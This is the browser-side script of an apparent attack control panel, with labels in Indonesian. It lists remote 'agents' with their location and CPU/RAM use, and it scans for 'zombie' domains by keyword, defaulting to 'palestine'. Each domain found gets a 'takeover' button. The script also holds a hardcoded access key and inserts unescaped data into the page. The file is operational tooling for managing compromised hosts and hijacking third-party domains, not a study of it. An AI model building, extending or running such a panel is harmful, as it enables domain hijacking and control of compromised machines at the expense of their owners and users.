// commander.js
let agents = [];

window.onload = function() {
  loadAgents();
  loadIntelFeed();
  setInterval(loadAgents, 10000);        // Auto-refresh agent
  setInterval(loadIntelFeed, 15000);     // Auto-refresh intel
};

function loadAgents() {
  fetch('/api/agents')
    .then(r => r.json())
    .then(data => {
      agents = data;
      const select = document.getElementById('agent-select');
      select.innerHTML = '<option value="">Pilih Agent</option>';
      data.forEach(a => {
        const opt = document.createElement('option');
        opt.value = a.id;
        opt.textContent = `${a.id} (${a.location})`;
        select.appendChild(opt);
      });
      updateAgentList(data);
    });
}

function updateAgentList(agents) {
  const list = document.getElementById('agent-list');
  list.innerHTML = agents.map(a => `
    <div class="agent-item">
      <b>[${a.id}]</b> ${a.location} | CPU: ${a.cpu}% | RAM: ${a.ram}%
      <span class="time">${a.last_seen}</span>
    </div>
  `).join('');
}

function scanZombie() {
  const keyword = document.getElementById('keyword').value || 'palestine';
  const resultsDiv = document.getElementById('zombie-results');
  resultsDiv.innerHTML = '🔍 Memindai...';

  fetch('/api/zombie/scan?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ keyword })
  })
  .then(r => r.json())
  .then(data => {
    resultsDiv.innerHTML = data.map(z => `
      <div class="zombie-item">
        <b>🧟 ${z.domain}</b> (${z.status})<br>
        <small>Risiko: ${z.risk.toUpperCase()}</small><br>
        <button onclick="takeover('${z.domain}')">🚀 Ambil Alaih</button>
      </div>
    `).join('');
  });
}